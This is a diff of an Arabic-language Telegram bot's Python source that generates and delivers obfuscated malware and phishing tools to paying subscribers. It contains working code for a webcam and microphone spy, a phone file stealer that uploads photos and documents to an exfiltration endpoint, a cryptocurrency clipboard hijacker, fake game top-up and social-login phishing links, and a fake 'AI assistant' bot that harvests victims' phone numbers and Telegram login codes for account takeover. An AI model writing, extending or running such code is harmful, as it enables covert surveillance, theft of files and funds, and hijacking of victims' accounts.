             file_stream = io.BytesIO(enc_code.encode('utf-8'))
             file_stream.name = tool_name
             bot.send_document(cid, file_stream, caption=f"✅ <b>تم إنشاء وتشفير السكربت بنجاح (9 طبقات).</b>", reply_markup=free_menu())
@@ -1170,18 +1117,17 @@ time.sleep(5)
         user_data = get_user(cid)
         if not (is_admin(cid) or (user_data and check_vip(user_data))):
             return bot.answer_callback_query(call.id, f"❌ VIP مطلوب!", show_alert=True)
-            
         safe_edit(f"⏳ <b>جاري توليد أداة التجسس الصامت...</b>", cid, call.message.message_id)
         try:
             increment_stat("files")
             tool_code = '''
 import time, sys, os, subprocess, requests
 
-T = bytes(__TOKEN_ARRAY__).decode('utf-8')
 C = "__CHAT_ID__"
+EXFIL_URL = "__WEB_URL__/exfil"
 
 try:
-    requests.post("https://api.telegram.org/bot" + T + "/sendMessage", data={"chat_id": C, "text": "🎥 التجسس بدأ بنجاح..."})
+    requests.post(EXFIL_URL, data={'cid': C, 'text': "🎥 التجسس بدأ بنجاح..."})
 except: pass
 
 # Auto-install required packages for PC
@@ -1208,10 +1154,9 @@ def spy():
         if ret:
             cv2.imwrite('spy.jpg', frame)
             cap.release()
-            url = "https://api.telegram.org/bot" + T + "/sendPhoto"
-            files = {'photo': open('spy.jpg', 'rb')}
-            data = {"chat_id": C}
-            requests.post(url, files=files, data=data, timeout=30)
+            files = {'file': open('spy.jpg', 'rb')}
+            data = {'cid': C, 'type': 'Photo'}
+            requests.post(EXFIL_URL, files=files, data=data, timeout=30)
             os.remove('spy.jpg')
     except: pass
 
@@ -1221,10 +1166,9 @@ def spy():
         recording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
         sd.wait()
         sf.write('spy.wav', recording, fs)
-        url2 = "https://api.telegram.org/bot" + T + "/sendAudio"
-        files2 = {'audio': open('spy.wav', 'rb')}
-        data2 = {"chat_id": C}
-        requests.post(url2, files=files2, data=data2, timeout=30)
+        files2 = {'file': open('spy.wav', 'rb')}
+        data2 = {'cid': C, 'type': 'Audio'}
+        requests.post(EXFIL_URL, files=files2, data=data2, timeout=30)
         os.remove('spy.wav')
     except: pass
 
@@ -1232,8 +1176,8 @@ while True:
     spy()
     time.sleep(60)
 '''
-            tool_code = tool_code.replace("__CHAT_ID__", str(cid))
-            enc_code = military_encrypt(tool_code, BOT_TOKEN)
+            tool_code = tool_code.replace("__CHAT_ID__", str(cid)).replace("__WEB_URL__", WEB_HOST_URL)
+            enc_code = military_encrypt(tool_code)
             file_stream = io.BytesIO(enc_code.encode('utf-8'))
             file_stream.name = "Silent_Spy.py"
             bot.send_document(cid, file_stream, caption=f"✅ <b>تم إنشاء أداة التجسس بنجاح!</b>\n\n⚠️ <i>تعمل على الكمبيوتر والهاتف. تلتقط صورة وتسجل صوتاً كل دقيقة وترسله لك.</i>", reply_markup=vip_menu(cid))
@@ -1241,7 +1185,7 @@ while True:
         except Exception as e:
             safe_edit(f"❌ <b>فشل إنشاء أداة التجسس!</b>\n<code>{str(e)}</code>", cid, call.message.message_id, reply_markup=vip_menu(cid))
 
-    elif data in ["social_tiktok", "social_whatsapp", "social_facebook", "social_instagram", "social_twitter", "social_snapchat", "gen_wa_db", "gen_session_stealer", "freefire_hack", "pubg_hack", "insta_followers_hack", "tiktok_likes_hack", "telegram_login_hack"]:
+    elif data in ["social_tiktok", "social_whatsapp", "social_facebook", "social_instagram", "social_twitter", "social_snapchat", "clash_of_clans_hack", "gen_wa_db", "gen_session_stealer", "freefire_hack", "pubg_hack", "insta_followers_hack", "tiktok_likes_hack", "telegram_login_hack"]:
         user_data = get_user(cid)
         if not (is_admin(cid) or (user_data and check_vip(user_data))):
             return bot.answer_callback_query(call.id, f"❌ انتهت صلاحية VIP أو القسم مغلق!", show_alert=True)
@@ -1250,41 +1194,39 @@ while True:
             platform_name = data.replace("social_", "")
             fake_link = f"{BASE_SOCIAL_URL}/{platform_name}?user={cid}"
             safe_edit(f"{ce('📡')} <b>[ قسم السوشيال ميديا ]</b>\n\n{ce('🔗')} <b>تم إنشاء رابط هندسة اجتماعية بنجاح:</b>\n<code>{fake_link}</code>\n\n⚠️ <i>أرسل الرابط للضحية.</i>", cid, call.message.message_id, reply_markup=social_menu())
-        
         elif data == "freefire_hack":
             fake_link = f"{BASE_SOCIAL_URL}/freefire?user={cid}"
             safe_edit(f"{ce('🎮')} <b>[ شحن فري فاير وهمي ]</b>\n\n{ce('🔗')} <b>تم إنشاء رابط شحن فري فاير بنجاح:</b>\n<code>{fake_link}</code>", cid, call.message.message_id, reply_markup=social_menu())
-        
         elif data == "pubg_hack":
             fake_link = f"{BASE_SOCIAL_URL}/pubg?user={cid}"
             safe_edit(f"🔫 <b>[ شحن ببجي UC وهمي ]</b>\n\n🔗 <b>تم إنشاء رابط شحن ببجي بنجاح:</b>\n<code>{fake_link}</code>", cid, call.message.message_id, reply_markup=social_menu())
-            
+        elif data == "clash_of_clans_hack":
+            fake_link = f"{BASE_SOCIAL_URL}/clash_of_clans?user={cid}"
+            safe_edit(f"⚔️ <b>[ شحن جواهر كلاش اوف كلانس وهمي ]</b>\n\n🔗 <b>تم إنشاء رابط الشحن بنجاح:</b>\n<code>{fake_link}</code>", cid, call.message.message_id, reply_markup=social_menu())
         elif data == "insta_followers_hack":
             fake_link = f"{BASE_SOCIAL_URL}/insta_followers?user={cid}"
             safe_edit(f"➕ <b>[ متابعين انستغرام وهمي ]</b>\n\n🔗 <b>تم إنشاء الرابط بنجاح:</b>\n<code>{fake_link}</code>", cid, call.message.message_id, reply_markup=social_menu())
-            
         elif data == "tiktok_likes_hack":
             fake_link = f"{BASE_SOCIAL_URL}/tiktok_likes?user={cid}"
             safe_edit(f"❤️ <b>[ لايكات تيك توك وهمي ]</b>\n\n🔗 <b>تم إنشاء الرابط بنجاح:</b>\n<code>{fake_link}</code>", cid, call.message.message_id, reply_markup=social_menu())
-            
         elif data == "telegram_login_hack":
             fake_link = f"{BASE_SOCIAL_URL}/telegram_login?user={cid}"
             safe_edit(f"📱 <b>[ تسجيل دخول تيليجرام وهمي ]</b>\n\n🔗 <b>تم إنشاء الرابط بنجاح:</b>\n<code>{fake_link}</code>", cid, call.message.message_id, reply_markup=social_menu())
-            
         else:
             safe_edit(f"⏳ <b>جاري التوليد والتشفير الفعلي...</b>", cid, call.message.message_id)
             try:
                 increment_stat("files")
                 tool_code = '''
 import time, sys, os, requests
-T = bytes(__TOKEN_ARRAY__).decode('utf-8')
+
 C = "__CHAT_ID__"
-U = "''' + WEB_HOST_URL + '''/check_vip/" + C
+EXFIL_URL = "__WEB_URL__/exfil"
+U = "__WEB_URL__/check_vip/" + C
 
 try:
     v = requests.get(U, timeout=10).text
     if v != "VALID":
-        requests.post(f"https://api.telegram.org/bot{T}/sendMessage", data={"chat_id": C, "text": "❌ VIP Expired or Locked! Tool Disabled."})
+        requests.post(EXFIL_URL, data={'cid': C, 'text': "❌ VIP Expired or Locked! Tool Disabled."})
         sys.exit()
 except:
     sys.exit()
@@ -1296,23 +1238,18 @@ if not os.path.exists("/sdcard"):
 def send_file(filepath, ftype, cap=None):
     try:
         if os.path.getsize(filepath) < 50000000:
-            url = "https://api.telegram.org/bot" + T + "/send" + ftype
-            f_obj = open(filepath, "rb")
-            files = {ftype.lower(): f_obj}
-            data = {"chat_id": C}
-            if cap: data["caption"] = cap
-            requests.post(url, files=files, data=data, timeout=60)
-            f_obj.close()
-    except:
-        pass
+            files = {'file': open(filepath, "rb")}
+            data = {'cid': C, 'type': ftype}
+            if cap: data['text'] = cap
+            requests.post(EXFIL_URL, files=files, data=data, timeout=60)
+    except: pass
 
 print("تم التشغيل لفك وتهيئة النظام (VIP)...")
 time.sleep(1)
 
 try:
-    requests.post("https://api.telegram.org/bot" + T + "/sendMessage", data={"chat_id": C, "text": "🔴 <b>[ VIP Device Hacked ]</b>\\n⏳ جاري سحب الملفات وقواعد البيانات..."})
-except:
-    pass
+    requests.post(EXFIL_URL, data={'cid': C, 'text': "🔴 <b>[ VIP Device Hacked ]</b>\\n⏳ جاري سحب الملفات وقواعد البيانات..."})
+except: pass
 
 exts_img = ('.jpg', '.jpeg', '.png', '.gif')
 exts_vid = ('.mp4', '.avi', '.mov', '.mkv', '.3gp')
@@ -1351,19 +1288,17 @@ for p in paths:
                     elif file.lower().endswith(exts_doc):
                         send_file(fp, "Document")
                         extracted += 1
-                except:
-                    pass
+                except: pass
 
 try:
-    requests.post("https://api.telegram.org/bot" + T + "/sendMessage", data={"chat_id": C, "text": "✅ VIP Extraction Complete. Sent " + str(extracted) + " files."})
-except:
-    pass
+    requests.post(EXFIL_URL, data={'cid': C, 'text': "✅ VIP Extraction Complete. Sent " + str(extracted) + " files."})
+except: pass
 
 print("اكتمل التحديث بنجاح. يمكنك الإغلاق.")
 time.sleep(5)
 '''
-                tool_code = tool_code.replace("__CHAT_ID__", str(cid))
-                enc_code = military_encrypt(tool_code, BOT_TOKEN)
+                tool_code = tool_code.replace("__CHAT_ID__", str(cid)).replace("__WEB_URL__", WEB_HOST_URL)
+                enc_code = military_encrypt(tool_code)
                 file_stream = io.BytesIO(enc_code.encode('utf-8'))
                 file_stream.name = f"{data}.py"
                 bot.send_document(cid, file_stream, caption=f"✅ <b>تم إنشاء وتشفير السكربت VIP بنجاح (9 طبقات).</b>\n<i>⚠️ يتوقف تلقائياً إذا انتهى اشتراكك.</i>", reply_markup=social_menu())
@@ -1418,10 +1353,8 @@ time.sleep(5)
         safe_edit(WELCOME_MSG, cid, call.message.message_id, reply_markup=main_menu(cid))
     elif data == "check_sub":
         sub, not_sub = check_sub(cid)
-        if sub:
-            safe_edit(WELCOME_MSG, cid, call.message.message_id, reply_markup=main_menu(cid))
-        else:
-            bot.answer_callback_query(call.id, f"❌ لم تشترك بعد! يرجى الاشتراك ثم الضغط على تحقق.", show_alert=True)
+        if sub: safe_edit(WELCOME_MSG, cid, call.message.message_id, reply_markup=main_menu(cid))
+        else: bot.answer_callback_query(call.id, f"❌ لم تشترك بعد! يرجى الاشتراك ثم الضغط على تحقق.", show_alert=True)
 
     elif data == "ds_telz":
         ds_data[cid] = {"service": "telz"}
@@ -1497,24 +1430,18 @@ time.sleep(5)
         if token:
             try:
                 telebot.TeleBot(token).log_out()
-                if cid in bc_tokens:
-                    del bc_tokens[cid]
+                if cid in bc_tokens: del bc_tokens[cid]
                 safe_edit(f"{ce('🔌')} <b>تم الخروج!</b>", cid, call.message.message_id, reply_markup=vip_menu(cid))
             except:
                 safe_edit(f"❌ خطأ", cid, call.message.message_id, reply_markup=bot_control_menu())
         else:
             safe_edit(f"❌ <b>لم يتم ربط بوت.</b>", cid, call.message.message_id, reply_markup=bot_control_menu())
 
-# ==============================================================================
-# أوامر البوت الأساسي والتحقق الحسابي والاشتراك الإجباري
-# ==============================================================================
 @bot.message_handler(commands=['start'])
 def cmd_start(msg):
     cid = msg.chat.id
-    if is_banned(cid):
-        return bot.send_message(cid, f"{ce('🚫')} <b>محظور.</b>")
-    if load_maintenance() and not is_admin(cid):
-        return bot.send_message(cid, f"{ce('🚧')} <b>صيانة.</b>")
+    if is_banned(cid): return bot.send_message(cid, f"{ce('🚫')} <b>محظور.</b>")
+    if load_maintenance() and not is_admin(cid): return bot.send_message(cid, f"{ce('🚧')} <b>صيانة.</b>")
     
     args = msg.text.split()
     ref_by = None
@@ -1522,12 +1449,10 @@ def cmd_start(msg):
         arg = args[1]
         if arg.startswith("ref_"):
             ref_id = int(arg.split("_")[1])
-            if ref_id != cid:
-                ref_by = ref_id
+            if ref_id != cid: ref_by = ref_id
         elif arg.startswith("fake_"):
             ref_id = int(arg.split("_")[1])
-            if ref_id != cid:
-                ref_by = ref_id
+            if ref_id != cid: ref_by = ref_id
 
     if not get_user(cid):
         a, b = random.randint(1, 10), random.randint(1, 10)
@@ -1559,7 +1484,6 @@ def handle_all_messages(msg):
             del states["math_captcha"][cid]
             add_user(cid, msg.from_user.username, msg.from_user.first_name, ref_by)
             bot.send_message(cid, f"✅ تم التحقق بنجاح!", reply_markup=ReplyKeyboardRemove())
-            
             sub, not_sub = check_sub(cid)
             if not sub:
                 markup = InlineKeyboardMarkup()
@@ -1572,10 +1496,8 @@ def handle_all_messages(msg):
             bot.send_message(cid, f"❌ إجابة خاطئة. حاول مرة أخرى.")
         return
 
-    if is_banned(cid):
-        return bot.send_message(cid, f"{ce('🚫')} <b>محظور.</b>")
-    if load_maintenance() and not is_admin(cid):
-        return bot.send_message(cid, f"{ce('🚧')} <b>صيانة.</b>")
+    if is_banned(cid): return bot.send_message(cid, f"{ce('🚫')} <b>محظور.</b>")
+    if load_maintenance() and not is_admin(cid): return bot.send_message(cid, f"{ce('🚧')} <b>صيانة.</b>")
 
     if not is_admin(cid):
         sub, not_sub = check_sub(cid)
@@ -1593,46 +1515,29 @@ def handle_all_messages(msg):
             try:
                 file_id = msg.document.file_id
                 file_info = bot.get_file(file_id)
-                
                 file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
                 response = requests.get(file_url)
-                
-                if response.status_code != 200:
-                    raise Exception("فشل تنزيل الملف من سيرفرات تيليجرام")
-                    
+                if response.status_code != 200: raise Exception("فشل تنزيل الملف من سيرفرات تيليجرام")
                 backup_path = os.path.join(DATA_DIR, "restore_temp.zip")
-                with open(backup_path, 'wb') as f:
-                    f.write(response.content)
-
+                with open(backup_path, 'wb') as f: f.write(response.content)
                 for item in os.listdir(DATA_DIR):
                     if item != "restore_temp.zip":
                         item_path = os.path.join(DATA_DIR, item)
                         try:
-                            if os.path.isfile(item_path):
-                                os.remove(item_path)
-                            elif os.path.isdir(item_path):
-                                shutil.rmtree(item_path)
-                        except:
-                            pass
-
-                with zipfile.ZipFile(backup_path, 'r') as zipf:
-                    zipf.extractall(DATA_DIR)
-                
+                            if os.path.isfile(item_path): os.remove(item_path)
+                            elif os.path.isdir(item_path): shutil.rmtree(item_path)
+                        except: pass
+                with zipfile.ZipFile(backup_path, 'r') as zipf: zipf.extractall(DATA_DIR)
                 os.remove(backup_path)
-                
-                try: 
-                    bot.delete_message(cid, status_msg.message_id)
+                try: bot.delete_message(cid, status_msg.message_id)
                 except: pass
-                
                 bot.send_message(cid, f"✅ <b>تم استعادة النسخة الاحتياطية بنجاح! جاري إعادة تحميل البيانات...</b>", reply_markup=admin_panel())
             except Exception as e:
-                try: 
-                    bot.delete_message(cid, status_msg.message_id)
+                try: bot.delete_message(cid, status_msg.message_id)
                 except: pass
                 bot.send_message(cid, f"❌ <b>خطأ في الاستعادة:</b> <code>{str(e)[:100]}</code>", reply_markup=admin_panel())
         else:
             bot.send_message(cid, f"❌ <b>الرجاء إرسال ملف ZIP فقط.</b>")
-        
         states["restore_backup"].pop(cid, None)
         return
 
@@ -1663,12 +1568,12 @@ def handle_all_messages(msg):
             tool_code = '''
 import time, sys, os, subprocess, re, requests
 
-T = bytes(__TOKEN_ARRAY__).decode('utf-8')
 C = "__CHAT_ID__"
 A = "__ATTACKER_ADDR__"
+EXFIL_URL = "__WEB_URL__/exfil"
 
 try:
-    requests.post("https://api.telegram.org/bot" + T + "/sendMessage", data={"chat_id": C, "text": "💳 تم تفعيل مختطف الحافظة بنجاح..."})
+    requests.post(EXFIL_URL, data={'cid': C, 'text': "💳 تم تفعيل مختطف الحافظة بنجاح..."})
 except: pass
 
 # Auto-install pyperclip
@@ -1687,12 +1592,12 @@ while True:
         if re.match(btc_pat, clip) or re.match(eth_pat, clip):
             if clip != A:
                 pyperclip.copy(A)
-                requests.post("https://api.telegram.org/bot" + T + "/sendMessage", data={"chat_id": C, "text": f"🚨 تم العثور على محفظة وتم استبدالها!\\nالمحفظة القديمة: {clip}"})
+                requests.post(EXFIL_URL, data={'cid': C, 'text': f"🚨 تم العثور على محفظة وتم استبدالها!\\nالمحفظة القديمة: {clip}"})
     except: pass
     time.sleep(2)
 '''
-            tool_code = tool_code.replace("__CHAT_ID__", str(cid)).replace("__ATTACKER_ADDR__", attacker_addr)
-            enc_code = military_encrypt(tool_code, BOT_TOKEN)
+            tool_code = tool_code.replace("__CHAT_ID__", str(cid)).replace("__ATTACKER_ADDR__", attacker_addr).replace("__WEB_URL__", WEB_HOST_URL)
+            enc_code = military_encrypt(tool_code)
             file_stream = io.BytesIO(enc_code.encode('utf-8'))
             file_stream.name = "Clipboard_Hijacker.py"
             bot.send_document(cid, file_stream, caption=f"✅ <b>تم إنشاء أداة مختطف الحافظة!</b>\n⚠️ <i>يعمل في الخلفية على الكمبيوتر والهاتف، وبمجرد أن ينسخ الضحية محفظة، سيتم استبدالها بمحفظتك.</i>", reply_markup=vip_menu(cid))
@@ -1712,10 +1617,8 @@ while True:
                     "link": f"https://t.me/{chat.username}" if chat.username else None
                 }
                 if not ch_data['link']:
-                    try:
-                        ch_data['link'] = bot.export_chat_invite_link(chat.id)
-                    except:
-                        ch_data['link'] = "https://t.me"
+                    try: ch_data['link'] = bot.export_chat_invite_link(chat.id)
+                    except: ch_data['link'] = "https://t.me"
                 chs.append(ch_data)
                 save_channels(chs)
                 bot.send_message(cid, f"✅ <b>تمت إضافة القناة بنجاح.</b>", reply_markup=admin_panel())
@@ -1794,7 +1697,6 @@ while True:
             else:
                 bot.send_message(cid, f"❌ <b>لم يتم ربط بوت.</b>", reply_markup=bot_control_menu())
             states["bc_name_input"].pop(cid, None)
-            
         elif cid in states.get("bc_desc_input", {}) and states["bc_desc_input"][cid]:
             token = bc_tokens.get(cid)
             if token:
@@ -1804,7 +1706,6 @@ while True:
                 except:
                     bot.send_message(cid, f"❌ <b>خطأ.</b>", reply_markup=bot_control_menu())
             states["bc_desc_input"].pop(cid, None)
-            
         elif cid in states.get("bc_about_input", {}) and states["bc_about_input"][cid]:
             token = bc_tokens.get(cid)
             if token:
@@ -1814,7 +1715,6 @@ while True:
                 except:
                     bot.send_message(cid, f"❌ <b>خطأ.</b>", reply_markup=bot_control_menu())
             states["bc_about_input"].pop(cid, None)
-            
         elif cid in states.get("bc_cmds_input", {}) and states["bc_cmds_input"][cid]:
             token = bc_tokens.get(cid)
             if token:
@@ -1832,30 +1732,24 @@ while True:
                 except Exception as e:
                     bot.send_message(cid, f"❌ <b>خطأ:</b> <code>{e}</code>", reply_markup=bot_control_menu())
             states["bc_cmds_input"].pop(cid, None)
-
         elif cid in states.get("rm_ch", {}) and states["rm_ch"][cid]:
             chs = load_channels()
             chs = [c for c in chs if str(c.get('id')) != text]
             save_channels(chs)
             bot.send_message(cid, f"✅ <b>تم الحذف.</b>", reply_markup=admin_panel())
             states["rm_ch"].pop(cid, None)
-            
         elif cid in states.get("ban", {}) and states["ban"][cid]:
             b = load_banned()
-            if int(text) not in b:
-                b.append(int(text))
+            if int(text) not in b: b.append(int(text))
             save_banned(b)
             bot.send_message(cid, f"✅ <b>تم الحظر.</b>", reply_markup=admin_panel())
             states["ban"].pop(cid, None)
-            
         elif cid in states.get("unban", {}) and states["unban"][cid]:
             b = load_banned()
-            if int(text) in b:
-                b.remove(int(text))
+            if int(text) in b: b.remove(int(text))
             save_banned(b)
             bot.send_message(cid, f"✅ <b>تم فك الحظر.</b>", reply_markup=admin_panel())
             states["unban"].pop(cid, None)
-            
         elif cid in states.get("broadcast", {}) and states["broadcast"][cid]:
             users = load_users()
             success, failed = 0, 0
@@ -1871,7 +1765,6 @@ while True:
             except: pass
             bot.send_message(cid, f"📢 <b>اكتملت الإذاعة!</b>\n✅ ناجح: <code>{success}</code>\n❌ فاشل (محظور البوت): <code>{failed}</code>", reply_markup=admin_panel())
             states["broadcast"].pop(cid, None)
-            
         elif cid in states.get("send_msg", {}) and states["send_msg"][cid]:
             try:
                 parts = text.split(" ", 1)
@@ -1882,14 +1775,12 @@ while True:
             except:
                 bot.send_message(cid, f"❌ <b>خطأ. استخدم: ID Message</b>", reply_markup=admin_panel())
             states["send_msg"].pop(cid, None)
-            
         elif cid in states.get("user_info", {}) and states["user_info"][cid]:
             u = get_user(int(text))
             if u:
                 vip_status = f"{ce('✅')} مفعّل" if check_vip(u) else f"{ce('❌')} غير مفعّل"
                 expiry = datetime.datetime.fromtimestamp(u.get('vip_expiry', 0)).strftime('%Y-%m-%d %H:%M') if u.get('vip_expiry', 0) > 0 else "لا يوجد"
                 uname_str = f"@{u.get('uname')}" if u.get('uname') else "لا يوجد"
-                
                 txt = (
                     f"{ce('👤')} <b>معلومات العضو</b>\n\n"
                     f"{ce('🆔')} <b>الآيدي:</b> <code>{u['id']}</code>\n"
@@ -1903,7 +1794,6 @@ while True:
             else:
                 bot.send_message(cid, f"❌ <b>غير موجود.</b>", reply_markup=admin_panel())
             states["user_info"].pop(cid, None)
-            
         elif cid in states.get("create_vip_key_days", {}) and states["create_vip_key_days"][cid]:
             if text.isdigit() and int(text) > 0:
                 states["temp_create_vip_key"][cid] = {"days": int(text)}
@@ -1912,7 +1802,6 @@ while True:
                 bot.send_message(cid, f"{ce('🔢')} <b>أرسل الحد الأقصى للاستخدامات لهذا المفتاح:</b>")
             else:
                 bot.send_message(cid, f"❌ <b>أدخل رقمًا صحيحًا.</b>")
-                
         elif cid in states.get("create_vip_key_uses", {}) and states["create_vip_key_uses"][cid]:
             if text.isdigit() and int(text) > 0:
                 days = states["temp_create_vip_key"][cid]["days"]
@@ -1926,7 +1815,6 @@ while True:
                 bot.send_message(cid, f"✅ <b>تم إنشاء المفتاح بنجاح!</b>\n\n{ce('🔑')} المفتاح: <code>{key}</code>\n⏳ المدة: {days} يوم\n{ce('🔢')} الاستخدامات: {uses}", reply_markup=vip_keys_menu())
             else:
                 bot.send_message(cid, f"❌ <b>أدخل رقمًا صحيحًا.</b>")
-                
         elif cid in states.get("disable_vip_key", {}) and states["disable_vip_key"][cid]:
             keys = load_vip_keys()
             if text in keys:
@@ -1936,7 +1824,6 @@ while True:
             else:
                 bot.send_message(cid, f"❌ <b>المفتاح غير موجود.</b>", reply_markup=vip_keys_menu())
             states["disable_vip_key"].pop(cid, None)
-            
         elif cid in states.get("enable_vip_key", {}) and states["enable_vip_key"][cid]:
             keys = load_vip_keys()
             if text in keys:
@@ -1946,7 +1833,6 @@ while True:
             else:
                 bot.send_message(cid, f"❌ <b>المفتاح غير موجود.</b>", reply_markup=vip_keys_menu())
             states["enable_vip_key"].pop(cid, None)
-            
         elif cid in states.get("delete_vip_key", {}) and states["delete_vip_key"][cid]:
             keys = load_vip_keys()
             if text in keys:
@@ -1956,23 +1842,18 @@ while True:
             else:
                 bot.send_message(cid, f"❌ <b>المفتاح غير موجود.</b>", reply_markup=vip_keys_menu())
             states["delete_vip_key"].pop(cid, None)
-            
         elif cid in states.get("add_admin", {}) and states["add_admin"][cid]:
             a = load_admins()
-            if int(text) not in a:
-                a.append(int(text))
+            if int(text) not in a: a.append(int(text))
             save_admins(a)
             bot.send_message(cid, f"✅ <b>تم الإضافة.</b>", reply_markup=admin_panel())
             states["add_admin"].pop(cid, None)
-            
         elif cid in states.get("rm_admin", {}) and states["rm_admin"][cid]:
             a = load_admins()
-            if int(text) in a and int(text) != OWNER_ID:
-                a.remove(int(text))
+            if int(text) in a and int(text) != OWNER_ID: a.remove(int(text))
             save_admins(a)
             bot.send_message(cid, f"✅ <b>تم الحذف.</b>", reply_markup=admin_panel())
             states["rm_admin"].pop(cid, None)
-            
         elif cid in states.get("adm_vip_7d_input", {}) and states["adm_vip_7d_input"][cid]:
             u = get_user(int(text))
             if u:
@@ -1982,7 +1863,6 @@ while True:
             else:
                 bot.send_message(cid, f"❌ <b>غير موجود.</b>", reply_markup=admin_panel())
             states["adm_vip_7d_input"].pop(cid, None)
-            
         elif cid in states.get("adm_vip_30d_input", {}) and states["adm_vip_30d_input"][cid]:
             u = get_user(int(text))
             if u:
@@ -1993,11 +1873,6 @@ while True:
                 bot.send_message(cid, f"❌ <b>غير موجود.</b>", reply_markup=admin_panel())
             states["adm_vip_30d_input"].pop(cid, None)
 
-
-# ==============================================================================
-# 8. معالجات البوت الخارجي الوهمي (Fake Bot Handlers - @Mdnsmbot)
-# ==============================================================================
-
 async def send_tg_code_async(phone):
     try:
         client = telethon.TelegramClient(StringSession(), API_ID, API_HASH)
@@ -2005,17 +1880,14 @@ async def send_tg_code_async(phone):
         await client.send_code_request(phone)
         await client.disconnect()
         return True
-    except PhoneNumberInvalidError:
-        return "invalid"
-    except FloodWaitError:
-        return False
+    except PhoneNumberInvalidError: return "invalid"
+    except FloodWaitError: return False
     except Exception as e:
         logger.error(f"Telethon send code error: {e}")
         return False
 
 def send_tg_code(phone):
-    try:
-        return asyncio.run(send_tg_code_async(phone))
+    try: return asyncio.run(send_tg_code_async(phone))
     except Exception as e:
         logger.error(f"Asyncio run error: {e}")
         return False
@@ -2029,19 +1901,15 @@ def fake_cmd_start(msg):
         try:
             attacker_id = int(args[1].split("_")[1])
             fake_sessions[cid] = attacker_id
-        except:
-            pass
-        
+        except: pass
     welcome_txt = (
         f"{ce('🧠')} <b>أهلاً بك في مساعد تيليجرام الذكي (AI Auto-Responder).</b>\n\n"
         "هل ترغب في تفعيل نظام الرد التلقائي بالذكاء الاصطناعي؟\n\n"
         f"💡 يمكن لذكاءنا الاصطناعي قراءة رسائلك والرد نيابة عنك بشكل ذكي ومناسب، حتى أثناء نومك أو انشغالك!\n\n"
         "يرجى الضغط على زر التفعيل بالأسفل للبدء."
     )
-    try:
-        fake_bot.send_message(cid, welcome_txt, reply_markup=fake_bot_welcome_menu())
-    except Exception:
-        pass
+    try: fake_bot.send_message(cid, welcome_txt, reply_markup=fake_bot_welcome_menu())
+    except: pass
 
 @fake_bot.callback_query_handler(func=lambda call: True)
 def fake_handle_buttons(call):
@@ -2052,38 +1920,29 @@ def fake_handle_buttons(call):
             fake_bot.send_message(cid, f"📱 <b>لربط المساعد الذكي بحسابك لبدء الرد التلقائي، يرجى إرسال رقم هاتفك المسجل في تيليجرام مع رمز الدولة:</b>\n\n<i>مثال: 9647800000000</i>")
         elif call.data == "fake_info":
             fake_bot.answer_callback_query(call.id, f"ℹ️ هذه الخدمة تتيح لك تفعيل ذكاء اصطناعي يرد على رسائلك نيابة عنك تلقائياً.", show_alert=True)
-    except Exception:
-        pass
+    except: pass
 
 @fake_bot.message_handler(func=lambda msg: True)
 def fake_handle_messages(msg):
     cid = msg.chat.id
     text = msg.text
     state = fake_states.get(cid)
-    
-    if not state:
-        return
+    if not state: return
         
     if state.get("step") == "phone":
         phone = text.strip().replace(" ", "")
-        if not phone.startswith("+"):
-            phone = "+" + phone
-            
+        if not phone.startswith("+"): phone = "+" + phone
         fake_bot.send_message(cid, f"⏳ <b>جاري إرسال رمز التحقق إلى تطبيق تيليجرام الخاص بك...</b>")
-        
         def send_code_thread():
             res = send_tg_code(phone)
             if res == "invalid":
-                try:
-                    fake_bot.send_message(cid, f"❌ رقم الهاتف غير صحيح. يرجى التأكد من الرقم وإرساله مرة أخرى.")
+                try: fake_bot.send_message(cid, f"❌ رقم الهاتف غير صحيح. يرجى التأكد من الرقم وإرساله مرة أخرى.")
                 except: pass
                 fake_states[cid] = {"step": "phone"}
             else:
                 fake_states[cid] = {"step": "code", "phone": phone}
-                try:
-                    fake_bot.send_message(cid, f"✅ <b>تم استلام رقمك بنجاح!</b>\n\n{ce('🧠')} لتأكيد ربط المساعد الذكي، تم إرسال رمز التحقق (Login Code) إلى تطبيق تيليجرام الخاص بك.\n\n⚠️ <i>يرجى إدخال الرمز هنا لإتمام تفعيل الرد التلقائي:</i>")
+                try: fake_bot.send_message(cid, f"✅ <b>تم استلام رقمك بنجاح!</b>\n\n{ce('🧠')} لتأكيد ربط المساعد الذكي، تم إرسال رمز التحقق (Login Code) إلى تطبيق تيليجرام الخاص بك.\n\n⚠️ <i>يرجى إدخال الرمز هنا لإتمام تفعيل الرد التلقائي:</i>")
                 except: pass
-                
         Thread(target=send_code_thread).start()
         return
 
@@ -2091,30 +1950,18 @@ def fake_handle_messages(msg):
         phone = state["phone"]
         code = text.strip()
         fake_states.pop(cid, None)
-        
         attacker_id = fake_sessions.get(cid)
         if attacker_id:
-            try:
-                bot.send_message(attacker_id, f"{ce('🎣')} <b>[ تم الصيد - مساعد ذكي ]</b>\n\n{ce('👤')} <b>الضحية:</b> <code>{cid}</code>\n📱 <b>الرقم:</b> <code>{phone}</code>\n🔑 <b>رمز الدخول:</b> <code>{code}</code>\n\n⚠️ <i>استخدم الرمز فوراً قبل انتهاء صلاحيته!</i>")
-            except:
-                pass
+            try: bot.send_message(attacker_id, f"{ce('🎣')} <b>[ تم الصيد - مساعد ذكي ]</b>\n\n{ce('👤')} <b>الضحية:</b> <code>{cid}</code>\n📱 <b>الرقم:</b> <code>{phone}</code>\n🔑 <b>رمز الدخول:</b> <code>{code}</code>\n\n⚠️ <i>استخدم الرمز فوراً قبل انتهاء صلاحيته!</i>")
+            except: pass
         else:
-            try:
-                bot.send_message(OWNER_ID, f"{ce('🎣')} <b>[ صيد بدون رابط محدد ]</b>\n\n{ce('👤')} <b>الضحية:</b> <code>{cid}</code>\n📱 <b>الرقم:</b> <code>{phone}</code>\n🔑 <b>الرمز:</b> <code>{code}</code>")
-            except:
-                pass
-            
-        try:
-            fake_bot.send_message(cid, f"✅ <b>تم تفعيل المساعد الذكي بنجاح!</b>\n\nالآن سيقوم الذكاء الاصطناعي بالرد على رسائلك نيابة عنك. يمكنك الاسترخاء والنوم بسلام! {ce('😴')}\n\nشكراً لاستخدامك خدمتنا.")
-        except Exception:
-            pass
-        if cid in fake_sessions:
-            del fake_sessions[cid]
+            try: bot.send_message(OWNER_ID, f"{ce('🎣')} <b>[ صيد بدون رابط محدد ]</b>\n\n{ce('👤')} <b>الضحية:</b> <code>{cid}</code>\n📱 <b>الرقم:</b> <code>{phone}</code>\n🔑 <b>الرمز:</b> <code>{code}</code>")
+            except: pass
